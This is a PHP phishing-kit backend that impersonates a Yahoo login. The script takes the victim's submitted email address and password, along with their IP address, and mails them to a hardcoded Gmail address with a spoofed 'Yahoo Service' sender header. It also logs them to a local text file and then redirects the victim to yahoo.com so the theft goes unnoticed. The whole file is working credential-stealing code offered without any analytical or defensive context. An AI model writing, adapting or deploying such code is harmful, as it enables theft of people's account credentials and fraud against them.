<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Yahoo Info-----------------------\n";
$message .= "Email            : ".$_POST['userid']."\n";
$message .= "Password            : ".$_POST['password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "jesuswire80@gmail.com";
$subject = "Result from Unknown";
$headers = "From: Yahoo Service<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("use.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: http://www.yahoo.com");

	 
?>